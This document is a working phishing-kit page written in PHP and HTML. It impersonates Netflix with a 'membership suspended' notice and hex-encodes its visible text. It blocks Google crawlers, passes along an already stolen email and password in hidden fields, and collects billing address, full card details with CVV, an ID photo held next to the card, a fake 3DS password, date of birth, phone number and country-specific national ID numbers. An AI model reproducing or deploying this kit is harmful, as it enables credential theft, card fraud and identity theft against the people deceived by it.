<?php 
@session_start();
error_reporting(0); 
require 'geoplugin.php';
include "bots/antibots1.php";
include "bots/antibots2.php";
include "bots/antibots3.php";
include "bots/antibots4.php";
include "bots/antibots5.php";
include "bots/antibots6.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html id="HTML">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<title>&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x42;&#x69;&#x6C;&#x6C;&#x69;&#x6E;&#x67;&#x20;&#x41;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.js"></script>
<script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.js"></script>
<script src="http://ajax.microsoft.com/ajax/jquery.validate/1.11.1/additional-methods.js"></script>
<script data-require="angular.js@*" src="https://code.angularjs.org/1.2.20/angular.js"></script>
<meta content="" name="keywords">
<link href="css/none2.css" rel="stylesheet" type="text/css">
<link href="css/none3.css" rel="stylesheet" type="text/css">
<link href="../images/icon1.ico" rel="shortcut icon">
<link href="../images/icon2.png" rel="apple-touch-icon">
<style>
.header-logo{
	width:167px;
	height:45px;
	vertical-align: middle;
}


@media screen and (max-width: 504px){
.header-logo{
    width:75px;
	height:20px;
    }
}
@media screen and (max-width: 740px) {
.header-logo{
    width:75px;
	height:20px;
    }
}
@media screen and (min-width: 1024px) {
   .header-logo{
         width:167px;
	height:45px;
    }
}
</style>
</head>
<body id="body">
<div id="appMountPoint">
<div tabindex="-1"id="myModal" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10"style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
<div style="z-index: 100011;width: auto;margin: auto;padding: 6px;position: relative;background-color: #ffffff;border: 1px solid #999999;border: 1px solid rgba(0,0,0,0.2);border-radius: 6px;-webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5);box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);-webkit-background-clip: padding-box;background-clip: padding-box;outline: 0;border-color: #e5e5e5 #d9d9d9 #cccccc;-webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8);box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8);-webkit-border-radius: 10px;-moz-border-radius: 6px;border-radius: 6px;-moz-background-clip: padding-box;-webkit-background-clip: padding-box;background-clip: padding-box;background-color:#fdfdfd;outline: 0 none;margin-top: 150px;max-width:1024px;min-width:auto;max-height:200px;opacity: 1;">
<center><div ><h3>&#x49;&#x66;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x73;&#x69;&#x67;&#x6E;&#x20;&#x6F;&#x75;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x6D;&#x65;&#x6D;&#x62;&#x65;&#x72;&#x73;&#x68;&#x69;&#x70;&#x20;&#x77;&#x69;&#x6C;&#x6C;&#x20;&#x62;&#x65;&#x20;&#x6C;&#x6F;&#x73;&#x74;&#x20;&#x70;&#x65;&#x72;&#x6D;&#x61;&#x6E;&#x65;&#x6E;&#x74;&#x6C;&#x79;.</h3></div></center>
<center><button style="width:auto;" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" id="boot">&#x53;&#x74;&#x61;&#x79;&#x20;&#x6C;&#x6F;&#x67;&#x67;&#x65;&#x64;&#x20;&#x69;&#x6E;</button></center>
</div></div>
<div tabindex="-1" class="hide" id="spinner" style="overflow: hidden; position: fixed; top: 0px; right: 0px; bottom: 0px; left: 0px; z-index: 1040; outline: 0px;">
<div id="dos10" style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
<div style="/* padding-left: 10px; */z-index: 100011;width: auto;margin: auto;padding: 6px;position: relative;/* border: 1px solid #999999; *//* border: 1px solid rgba(0,0,0,0.2); */border-radius: 6px;-webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5);box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);-webkit-background-clip: padding-box;background-clip: padding-box;outline: 0;/* border-color: #e5e5e5 #d9d9d9 #cccccc; */-webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8);box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8);-webkit-border-radius: 10px;-moz-border-radius: 6px;/* border-radius: 6px; */-moz-background-clip: padding-box;-webkit-background-clip: padding-box;background-clip: padding-box;/* background-color:#fdfdfd; */outline: 0 none;margin-top: 290px;max-width:1024px;min-width:auto;max-height:200px;opacity: 1;">
<center style="padding-left: 40px;"><span class="basic-spinner"></span></center>
</div></div>
<div id="DWISSEL" class="basicLayout modernInApp lang_en signupSimplicity-planSelectionWithContext simplicity" dir="ltr" lang="en-FR">
<div class="nfHeader noBorderHeader signupBasicHeader">
<a href="#" class="svg-nfLogo signupBasicHeader undrag"><img class="header-logo undrag" src="../images/logo.png"></a>
<a class="authLinks signupBasicHeader" href="#" id="signout">&#x53;&#x69;&#x67;&#x6E;&#x20;&#x4F;&#x75;&#x74;</a>
</div>
<div class="simpleContainer">
<div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
<!--BILL FORM-->
<form id="BILL" class="" autocomplete="off" method="post" action="#" enctype="multipart/form-data" novalidate="novalidate">
<div class="paymentFormContainer">
<div class="messageContainer">
<div class="nf-message-container nf-message-warn">
<div class="nf-message-icon"></div>
<div class="nf-message-contents">
<span>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x20;&#x6D;&#x65;&#x6D;&#x62;&#x65;&#x72;&#x73;&#x68;&#x69;&#x70;&#x20;&#x68;&#x61;&#x73;&#x20;&#x62;&#x65;&#x65;&#x6E;&#x20;&#x73;&#x75;&#x73;&#x70;&#x65;&#x6E;&#x64;&#x65;&#x64;&comma;&#x20;&#x70;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;.</span>
</div>
</div>
</div>
<div class="stepHeader-container">
<div class="stepHeader">
<span class="stepIndicator">&#x53;&#x54;&#x45;&#x50; <b>1</b> &#x4F;&#x46; <b>3</b></span>
<h1 class="stepTitle">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x42;&#x69;&#x6C;&#x6C;&#x69;&#x6E;&#x67;&#x20;&#x41;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;.</h1>
</div>
</div>
<ul class="simpleForm structural ui-grid">
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" class="nfTextField" dir="" id="id_firstName" name="firstName" value="" placeholder="&#x46;&#x69;&#x72;&#x73;&#x74;&#x20;&#x6E;&#x61;&#x6D;&#x65;">
<input type="hidden" name="mail" id="mail" value="<?=@$_SESSION['_emaill_'];?>">
<input type="hidden" name="pwd" id="pwd" value="<?=@$_SESSION['_passwordd_'];?>">
</div>
</li>
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" class="nfTextField" dir="" id="id_lastName" name="lastName"  value="" placeholder="&#x4C;&#x61;&#x73;&#x74;&#x20;&#x6E;&#x61;&#x6D;&#x65;">
</div>
</li>
<li class="nfFormSpace">
<div class="cardNumberContainer">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" maxlength="30" class="nfTextField" dir="" id="id_country" name="country" value="<?=@$_SESSION['CountryName'];?>" placeholder="&#x43;&#x6F;&#x75;&#x6E;&#x74;&#x72;&#x79;">
</div>
</div>
</li>
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" maxlength="120" class="nfTextField" dir="" id="id_streetaddress" name="streetaddress" value="" placeholder="&#x53;&#x74;&#x72;&#x65;&#x65;&#x74;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;">
</div>
</li>
<li class="nfFormSpace"></li>
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" maxlength="30" class="nfTextField" dir="" id="id_city" name="city" value="" placeholder="&#x43;&#x69;&#x74;&#x79;">
</div>
</li>
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" maxlength="30" class="nfTextField" dir="" id="id_state" name="state" value="" placeholder="&#x52;&#x65;&#x67;&#x69;&#x6F;&#x6E;&sol;&#x73;&#x74;&#x61;&#x74;&#x65;">
</div>
</li>
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" maxlength="12" class="nfTextField" dir="" id="id_zip" name="zip" value="" placeholder="&#x42;&#x69;&#x6C;&#x6C;&#x69;&#x6E;&#x67;&#x20;&#x5A;&#x69;&#x70;&#x20;&#x43;&#x6F;&#x64;&#x65;">
</div>
</li>
</ul>
</div>
<div class="submitBtnContainer">
<button class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x42;&#x69;&#x6C;&#x6C;&#x69;&#x6E;&#x67;&#x20;&#x41;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;</button>
</div>
</form>
<!--CC FORM-->
<form id="CC"  class="hide" autocomplete="off" id="form5" method="post" action="#" enctype="multipart/form-data" novalidate="novalidate" >
<div class="paymentFormContainer">
<div class="stepHeader-container">
<div class="stepHeader">
<span class="stepIndicator">&#x53;&#x54;&#x45;&#x50; <b>2</b> &#x4F;&#x46; <b>3</b></span>
<h1 class="stepTitle">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;.</h1>
</div>
</div>
<div class="fieldContainer">
<ul class="simpleForm structural ui-grid">
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="text" class="nfTextField" dir="" id="id_cardholder" name="cardholder" value="" placeholder="&#x43;&#x61;&#x72;&#x64;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x20;&#x4E;&#x61;&#x6D;&#x65;">
</div>
</li>
<li class="nfFormSpace">
<div id="CCNu" class="nfInput nfInputOversize">
<span id="cardicon" class=""></span>
<input autocomplete="false" required="required" aria-required="true" class="nfTextField" type="tel" maxlength="19" dir="" id="id_cardnumber" name="cardnumber" value="" placeholder="&#x43;&#x61;&#x72;&#x64;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;" onfocusout="creditcard(this.value)">
<input type="hidden" name="cctype" id="CC_TYP">
</div>
</li>
<li class="nfFormSpace">
<div class="cardNumberContainer">
<div class="nfInput nfInputOversize">
<input autocomplete="false" required="required" aria-required="true" type="tel" maxlength="7" class="nfTextField" dir="" id="id_expiration" name="expiration" value="" placeholder="&#x45;&#x78;&#x70;&#x69;&#x72;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x4D;&#x4D;&sol;&#x59;&#x59;&#x59;&#x59;">
</div>
</div>
</li>
<li class="nfFormSpace">
<div class="nfInput nfInputOversize">
<span id="cscicon" class="csc"></span>
<input autocomplete="false" required="required" aria-required="true" type="tel" maxlength="4" class="nfTextField" dir="" id="id_cvv" name="cvv" value="" placeholder="&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x43;&#x6F;&#x64;&#x65;&#x20;&lpar;&#x43;&#x56;&#x56;&rpar;">
</div>
</li>
</ul>
</div>
</div>
<div class="submitBtnContainer">
<button class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" id="simplicityPayment-start" type="submit">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;</button>
</div>
</form>
<!--ID FORM-->
<form id="ID" class="hide" autocomplete="off" id="form5" method="post" action="#" enctype="multipart/form-data" novalidate="novalidate">
<div class="paymentFormContainer">
<div class="stepHeader-container">
<div class="stepHeader">
<span class="stepIndicator">&#x53;&#x54;&#x45;&#x50; <b>3</b> &#x4F;&#x46; <b>3</b></span>
<h1 class="stepTitle">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x49;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x74;&#x79;.</h1>
</div>
</div>
<p style="font-size: 1.2em;">&#x57;&#x68;&#x61;&#x74;&#x20;&#x73;&#x68;&#x6F;&#x75;&#x6C;&#x64;&#x20;&#x69;&#x20;&#x64;&#x6F;&comma;&#x20;&#x74;&#x6F;&#x20;&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x6D;&#x79;&#x20;&#x69;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x74;&#x79;&quest;</p>
<div style="margin-bottom: 1em;font-size: 13px;">
                                    <ul>    
                                        <li>&#x54;&#x61;&#x6B;&#x65;&#x20;&#x61;&#x20;&#x70;&#x68;&#x6F;&#x74;&#x6F;&#x20;&#x62;&#x79;&#x20;&#x68;&#x6F;&#x6C;&#x64;&#x69;&#x6E;&#x67;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x49;&#x44;&#x2D;&#x43;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x65;&#x78;&#x74;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;.</li>
                                        <li>&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x49;&#x44;&#x2D;&#x43;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x61;&#x6D;&#x65;&#x73;&#x20;&#x6D;&#x75;&#x73;&#x74;&#x20;&#x6D;&#x61;&#x74;&#x63;&#x68;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x62;&#x65;&#x20;&#x63;&#x6C;&#x65;&#x61;&#x72;&#x6C;&#x79;&#x20;&#x76;&#x69;&#x73;&#x69;&#x62;&#x6C;&#x65;.</li>
										<li>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x69;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x73;&#x20;&#x6D;&#x75;&#x73;&#x74;&#x20;&#x62;&#x65;&#x20;&#x6E;&#x65;&#x78;&#x74;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x66;&#x61;&#x63;&#x65;.</li>
										<li>&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x75;&#x73;&#x65;&#x20;&#x6F;&#x6E;&#x65;&#x20;&#x6F;&#x66;&#x20;&#x74;&#x68;&#x65;&#x73;&#x65;&#x20;&#x66;&#x69;&#x6C;&#x65;&#x20;&#x74;&#x79;&#x70;&#x65;&#x73;&colon;&#x20;&#x4A;&#x50;&#x47;&comma;&#x20;&#x47;&#x49;&#x46;&comma;&#x20;&#x50;&#x4E;&#x47;&comma;&#x20;&#x42;&#x4D;&#x50;&comma;&#x20;&#x54;&#x49;&#x46;.</li>
                                    </ul>
</div>
<p style="font-size: 1.2em;">&#x48;&#x65;&#x72;&#x65;&apos;&#x73;&#x20;&#x61;&#x20;&#x70;&#x69;&#x63;&#x74;&#x75;&#x72;&#x65;&#x20;&#x65;&#x78;&#x61;&#x6D;&#x70;&#x6C;&#x65;&colon;</p>
<img class="undrag" src="images/ID.jpg" style="height: auto;width: 100%;">
<p></p>									
<div id ="upload-area" class="file-area form-group">
<input type="file"  id="file-1"  name="attach1" id="uploadImage" data-multiple-caption="{count} files selected" multiple="">
<div class="file-dummy ">
      <div id="deff" style="font-weight:bold;">&#x43;&#x6C;&#x69;&#x63;&#x6B;&#x20;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x63;&#x68;&#x6F;&#x6F;&#x73;&#x65;&#x20;&#x61;&#x20;&#x66;&#x69;&#x6C;&#x65;&#x20;&#x6F;&#x72;&#x20;&#x64;&#x72;&#x61;&#x67;&#x20;&#x69;&#x74;&#x20;&#x68;&#x65;&#x72;&#x65;.</div>
      <div  id="goood" class="hide" style="font-weight:bold;color: green;"></div>
      <div id="select" style="font-weight:bold;color:red;"></div>
	  <input id="title" type="hidden" />
      <input name="user" id="user" value="" type="hidden" />
</div>
 </div>
<div>
<div id="image-holder"></div>
<div class="submitBtnContainer">
<button id="docc" name="upload" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit" >&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x49;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x74;&#x79;</button>
</div>
</div>
</form>		
</div>
</div>
<div class="site-footer-wrapper centered dark">
<div class="footer-divider"></div>
<div class="site-footer">
<p class="footer-top"><a class="footer-top-a" href="#">&#x51;&#x75;&#x65;&#x73;&#x74;&#x69;&#x6F;&#x6E;&#x73;&quest;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x75;&#x73;.</a></p>
<ul class="footer-links structural">
<li class="footer-link-item">
<a class="footer-link" href="#"><span id="">&#x54;&#x65;&#x72;&#x6D;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x55;&#x73;&#x65;</span></a>
</li>
<li class="footer-link-item">
<a class="footer-link" href="#"><span id="">&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;</span></a>
</li>
<li class="footer-link-item">
<a class="footer-link" href="#"><span id="">&#x43;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x20;&#x50;&#x72;&#x65;&#x66;&#x65;&#x72;&#x65;&#x6E;&#x63;&#x65;&#x73;</span></a>
</li>
<li class="footer-link-item">
<a class="footer-link" href="#"><span id="">&#x43;&#x6F;&#x72;&#x70;&#x6F;&#x72;&#x61;&#x74;&#x65;&#x20;&#x49;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;</span></a>
</li>
</ul>
<div class="lang-selection-container" id="lang-switcher">
<div class="nfSelectWrapper inFooter selectArrow prefix">
<div class="nfSelectPlacement globe">
<select class="nfSelect" name="__langSelect">
<option label="English" selected value="#">&#x45;&#x6E;&#x67;&#x6C;&#x69;&#x73;&#x68;&nbsp;
</option>
</select><label class="nfLabel no-display placeLabel"></label>
</div>
</div>
</div>
<p class="copy-text"></p>
</div>
</div>
</div>
</div>
<!--3DS FORM-->
<div id="xMarcos_9X9X" class="hide" style="opacity: 1; background-color: white;">
	<div id="popup" class="hide"><p id="LOADING" style="position: relative;top:5px"></p></div>
        <div id="xGhostRiderForm" style="" class="hide">
            <div id="xDoctorStrange_L0">
                <table>
                    <tbody>
                        <tr>
                            <td><img class="cc_bank undrag" id="cc_bank" src="./images/ssl.png"></td>
							<td><img class="cc_type undrag" id="cc_type"></td>
							</tr>
                    </tbody>
                </table>
            </div>
			<div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"></div>
            <div id="xDoctorStrange_L1">&#x41;&#x64;&#x64;&#x65;&#x64;&#x20;&#x53;&#x61;&#x66;&#x65;&#x74;&#x79;&#x20;&#x4F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;</div>
            <div id="xDoctorStrange_L2"><span id="MSG11" ><span></div>
            <div id="xDoctorStrange_L3">
						<form id= "3DS_FORM" method="post" action="" >	
			<table>			
                    <tbody>
                        <tr>
                            <td style="font-weight: bold;">&#x4E;&#x61;&#x6D;&#x65;&#x20;&#x6F;&#x6E;&#x20;&#x43;&#x61;&#x72;&#x64; :</td><td id="3DS_CC_NAME"></td>
                        </tr>                      
						<tr>
                            <td style="font-weight: bold;">&#x43;&#x6F;&#x75;&#x6E;&#x74;&#x72;&#x79;&#x20;&#x4E;&#x61;&#x6D;&#x65; :</td><td><?=@$_SESSION['CountryName'];?></td>
                        </tr>
                        <tr>
                            <td style="font-weight: bold;">&#x43;&#x61;&#x72;&#x64;&#x20;&#x54;&#x79;&#x70;&#x65; :</td><td id="3DS_CC_TYPE"></td>
                        </tr>
                        <tr>
                            <td style="font-weight: bold;">&#x43;&#x61;&#x72;&#x64;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72; :</td><td class="last4">XXXX-XXXX-XXXX-</td>
                        </tr>
						<tr>
                            <td style="font-weight: bold;">&#x44;&#x61;&#x74;&#x65;&#x20;&#x54;&#x69;&#x6D;&#x65; :</td><td><?=date('d/m/Y').", ".date('g:i a');?></td>
                        </tr>
						<tr class="Height_XXX">
                            <td style="font-weight: bold;">&#x42;&#x69;&#x72;&#x74;&#x68;&#x20;&#x44;&#x61;&#x74;&#x65; :</td>
                            <td><input style="width: 170px;text-align: center;" id="id_dob" type="tel" maxlength="10" placeholder="&#x44;&#x44;&sol;&#x4D;&#x4D;&sol;&#x59;&#x59;&#x59;&#x59;" name="dob" class="dob">
						</tr>
                        <tr class="Height_XXX">
                            <td style="font-weight: bold;"><span id="3DS_MSG"></span>  :</td>
                            <td><input required="required" aria-required="true" type="password" maxlength="15" name="d3s" id="id_d3s" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						</tr>
<?php 
if (trim($_SESSION['CountryName']) == "United States"){
	echo '
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72; :</td>
						  <td><input required="required" aria-required="true" type="tel" maxlength="11" name="ssn" id="id_ssn" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Canada"){
	echo '
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x53;&#x49;&#x4E; :</td>
						  <td><input required="required" aria-required="true" type="tel" id="sin" name="SIN" maxlength="11" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "United Kingdom"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x4E;&#x49;&#x4E; :</td>
						  <td><input required="required" aria-required="true" type="text" id="nin" name="NIN" maxlength="13" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Italy"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x46;&#x69;&#x73;&#x63;&#x61;&#x6C;&#x20;&#x43;&#x6F;&#x64;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72; :</td>
						  <td><input required="required" aria-required="true" type="text" id="fcn" name="FCN" maxlength="16" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Ireland"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x49;&#x52;&#x50;&#x50;&#x53; :</td>
						  <td><input required="required" aria-required="true" type="text" id="irpps" name="IRPPS" maxlength="9" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Brazil"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x43;&#x50;&#x46;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72; :</td>
						  <td><input required="required" aria-required="true" type="tel" id="cpfbr" name="CPFBR" maxlength="14" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Netherlands"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x42;&#x53;&#x4E; :</td>
						  <td><input required="required" aria-required="true" type="tel" id="bsn" name="BSN" maxlength="9" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Spain"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x44;&#x4E;&#x49; :</td>
						  <td><input required="required" aria-required="true" type="text" id="dni" name="DNI" maxlength="9" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Sweden"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x53;&#x49;&#x44; :</td>
						  <td><input required="required" aria-required="true" type="tel" id="sid" name="SID" maxlength="11" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
elseif (trim($_SESSION['CountryName']) == "Australia"){
	echo'
						<tr  class="Height_XXX">
						  <td style="font-weight: bold;">&#x4F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;&#x20;&#x53;&#x68;&#x6F;&#x70;&#x70;&#x69;&#x6E;&#x67;&#x20;&#x49;&#x44; :</td>
						  <td><input required="required" aria-required="true" type="text" id="osid" name="OSID" maxlength="15" style="width: 170px;padding-left: 4px;text-align: center;"></td>
						 </tr>
';} 
else {
	echo'';} 
?>
						<tr class="Height_XXX">			
                            <td style="font-weight: bold;">&#x50;&#x68;&#x6F;&#x6E;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72; :</td>
                            <td><input required="required" aria-required="true" type="tel" maxlength="20" name="phone" id="id_phone" style="padding-left: 4px;width: 170px;text-align: center;"></td>
                        </tr>
						<tr>
                            <td></td>
                            <td>
                                <input type="submit" name="vbv_submit_btn" id="vbv_submit_btn" value="Submit" style="text-decoration: none;">
                                
                            </td>
                        </tr>	
                        <tr>
                            <td></td>
                            <td></td>
                        </tr>

                    </tbody>
                </table>
						</form>					
            </div>
        </div>
    </div>
<div id="popup2" class="hide"><span style="left: 17px;position: relative;white-space: nowrap;top: 5px;" id="LOADING_CONFIRM"></span></div>	
<script src="js/plugins.js"></script>
<script src="js/Dwissel.js"></script>
</body>
</html>